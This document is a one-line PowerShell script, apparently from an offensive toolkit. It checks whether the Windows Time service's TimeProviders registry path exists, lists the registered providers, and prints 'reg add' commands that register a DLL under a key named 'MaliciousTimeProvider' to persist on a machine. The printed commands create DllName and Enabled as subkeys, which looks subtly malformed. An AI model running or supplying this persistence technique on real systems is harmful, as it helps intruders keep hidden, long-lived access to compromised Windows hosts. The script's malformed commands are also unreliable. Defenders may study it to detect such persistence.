$CanPersist=$true;$RegPath="HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders";if(-not(Get-Service W32Time -ErrorAction SilentlyContinue)){$CanPersist=$false};if(-not(Test-Path $RegPath)){$CanPersist=$false};if(Test-Path $RegPath){Write-Host "Registered Time Providers:" -ForegroundColor Cyan;Get-ChildItem $RegPath|%{$Item=Get-ItemProperty $_.PSPath;Write-Host ("  {0,-20} Enabled={1} DLL={2}" -f $_.PSChildName,$Item.Enabled,$Item.DllName)}};Write-Host "";if($CanPersist){Write-Host "[RESULT] TimeProvider persistence may be possible." -ForegroundColor Yellow;Write-Host "";Write-Host "### Get persistence" -ForegroundColor Cyan;Write-Host "";Write-Host "reg add `"HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MaliciousTimeProvider`" /f";Write-Host "reg add `"HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MaliciousTimeProvider\DllName`" /ve /d `"C:\Path\To\DllName`" /f";Write-Host "reg add `"HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MaliciousTimeProvider\Enabled`" /ve /d `"1`" /t REG_DWORD /f"}else{Write-Host "[RESULT] TimeProvider persistence is unlikely." -ForegroundColor Green}